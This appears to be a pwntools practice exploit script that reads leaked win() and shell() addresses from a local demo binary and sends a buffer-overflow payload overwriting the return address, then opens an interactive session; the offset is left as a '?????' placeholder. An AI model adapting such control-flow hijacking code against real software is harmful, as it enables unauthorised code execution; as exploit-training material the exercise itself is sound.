from pwn import *

executable_name = "./demo-mac"
p = process(executable_name)


log.info(p.recvuntil(b"Address of win() function: "))
win_address = int(p.recvline(), 16)

log.info(p.recvuntil(b"Address of shell() function: "))
shell_address = int(p.recvline(), 16)

print(f"win_address: {hex(win_address)}")
print(f"shell_address: {hex(shell_address)}")
offset = ?????

payload = flat({offset: p64(win_address)})
payload = flat({offset: p64(shell_address)})

print(f"payload: {payload}")
p.sendline(payload)
p.interactive()